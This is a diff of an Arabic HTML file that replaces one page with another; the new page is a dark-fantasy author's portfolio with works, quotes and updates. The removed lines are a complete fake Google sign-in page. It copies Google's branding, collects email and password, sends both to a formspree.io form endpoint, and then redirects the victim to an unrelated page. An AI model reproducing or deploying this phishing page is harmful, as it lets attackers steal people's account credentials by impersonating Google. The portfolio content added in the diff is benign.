@@ -1,41 +1,177 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!DOCTYPE html><html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Google</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 100%; max-width: 450px; min-height: 400px; display: flex; flex-direction: column; }
-        .google-text { text-align: center; font-size: 24px; font-weight: 500; margin-bottom: 10px; }
-        .g-blue { color: #4285f4; } .g-red { color: #ea4335; } .g-yellow { color: #fbbc05; } .g-green { color: #34a853; }
-        .title { text-align: center; font-size: 22px; margin-bottom: 30px; font-weight: 400; }
-        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
-        input:focus { border: 2px solid #1a73e8; }
-        .footer { margin-top: auto; display: flex; justify-content: flex-end; }
-        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 30px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>شاهر | عالم بلا ظلال</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;600;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#0b0b0f;
+      --card:#14141c;
+      --accent:#8b0000;
+      --text:#e5e5e5;
+      --muted:#9a9a9a;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family:'Cairo',sans-serif;
+      background:radial-gradient(circle at top,var(--card),var(--bg));
+      color:var(--text);
+    }
+    header{
+      padding:80px 20px;
+      text-align:center;
+      border-bottom:1px solid #1f1f2a;
+    }
+    header h1{
+      font-size:3rem;
+      letter-spacing:2px;
+      margin:0;
+    }
+    header p{
+      color:var(--muted);
+      max-width:700px;
+      margin:20px auto 0;
+    }
+    nav{
+      position:sticky;
+      top:0;
+      background:#0b0b0fcc;
+      backdrop-filter:blur(10px);
+      display:flex;
+      justify-content:center;
+      gap:30px;
+      padding:15px;
+      z-index:10;
+    }
+    nav a{
+      color:var(--text);
+      text-decoration:none;
+      font-weight:600;
+      position:relative;
+    }
+    nav a::after{
+      content:'';
+      position:absolute;
+      bottom:-6px;
+      right:0;
+      width:0;
+      height:2px;
+      background:var(--accent);
+      transition:0.3s;
+    }
+    nav a:hover::after{width:100%}
+    section{
+      padding:80px 20px;
+      max-width:1200px;
+      margin:auto;
+    }
+    h2{
+      font-size:2.2rem;
+      margin-bottom:30px;
+      border-right:4px solid var(--accent);
+      padding-right:15px;
+    }
+    .grid{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+      gap:25px;
+    }
+    .card{
+      background:linear-gradient(145deg,#151520,#0d0d14);
+      padding:25px;
+      border-radius:16px;
+      box-shadow:0 20px 40px #00000066;
+      transition:transform 0.3s, box-shadow 0.3s;
+    }
+    .card:hover{
+      transform:translateY(-8px);
+      box-shadow:0 30px 60px #000000aa;
+    }
+    .quote{
+      font-size:1.1rem;
+      line-height:1.8;
+      color:#ddd;
+    }
+    .meta{
+      margin-top:15px;
+      font-size:0.9rem;
+      color:var(--muted);
+    }
+    footer{
+      background:#07070b;
+      padding:60px 20px;
+      text-align:center;
+      border-top:1px solid #1f1f2a;
+    }
+    footer a{
+      color:var(--accent);
+      margin:0 10px;
+      text-decoration:none;
+    }
+  </style>
 </head>
-<body>
-    <div class="login-card">
-        <div class="google-text">
-            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
-        </div>
-        <h1 class="title">تسجيل الدخول</h1>
-
-        <form action="https://formspree.io/f/xojwrkap" method="POST">
-            
-            <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-            
-            <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
-            
-            <input type="hidden" name="_next" value="https://www.musicful.ai/song/48835729232678919/">
-
-            <div class="footer">
-                <button type="submit" class="btn-next">التالي</button>
-            </div>
-        </form>
+<body><header>
+  <h1>شاهر درويش</h1>
+  <p>كاتب فنتازيا سوداوية | مؤسس عالم «ثيتانيوم» | حيث تُكتب الأسطورة بدم المعنى لا بالحبر</p>
+</header><nav>
+  <a href="#about">عنّي</a>
+  <a href="#works">الأعمال</a>
+  <a href="#quotes">اقتباسات</a>
+  <a href="#updates">التحديثات</a>
+  <a href="#contact">التواصل</a>
+</nav><section id="about">
+  <h2>عنّي</h2>
+  <div class="card">
+    <p>
+      أنا شاهر، أكتب عوالم لا تُقرأ بل تُسكن. أعمالي تميل إلى الفنتازيا الملحمية الداكنة،
+      حيث السلطة، الإيمان، الدم، والمصير، تتصارع داخل بنية سردية كثيفة ولغة خاصة.
+    </p>
+  </div>
+</section><section id="works">
+  <h2>الأعمال</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>ثيتانيوم – عالم بلا ظلال</h3>
+      <p class="meta">فنتازيا ملحمية | الجزء الأول</p>
     </div>
-</body>
+    <div class="card">
+      <h3>ثيتانيوم – دماء في الأزقة</h3>
+      <p class="meta">قيد الكتابة | تصعيد دموي سياسي</p>
+    </div>
+    <div class="card">
+      <h3>بلاد من قطن وحطب</h3>
+      <p class="meta">دراما سوداوية | رواية مستقلة</p>
+    </div>
+  </div>
+</section><section id="quotes">
+  <h2>اقتباسات</h2>
+  <div class="grid">
+    <div class="card quote">"نحن لا نخون أوطاننا، نحن فقط نكتشف أنها خانتنا أولاً."</div>
+    <div class="card quote">"حين يسقط الإله، لا يموت… بل يغيّر اسمه."</div>
+    <div class="card quote">"الدم لا يصنع الحرب، بل يكشف من كان ينتظرها."</div>
+  </div>
+</section><section id="updates">
+  <h2>التحديثات</h2>
+  <div class="card">
+    <ul>
+      <li>العمل على الجزء الثاني من «ثيتانيوم» – مرحلة الذروة.</li>
+      <li>تجهيز نسخة تقديم عالمية (Pitch Deck).</li>
+      <li>إطلاق موقع رسمي تفاعلي للعالم السردي.</li>
+    </ul>
+  </div>
+</section><section id="contact">
+  <h2>التواصل</h2>
+  <div class="card">
+    <p>تابعني عبر:</p>
+    <p>
+      <a href="#">Instagram</a> |
+      <a href="#">X</a> |
+      <a href="#">GitHub</a>
+    </p>
+  </div>
+</section><footer>
+  <p>© 2026 – شاهر درويش | عالم بلا ظلال</p>
+</footer></body>
 </html>
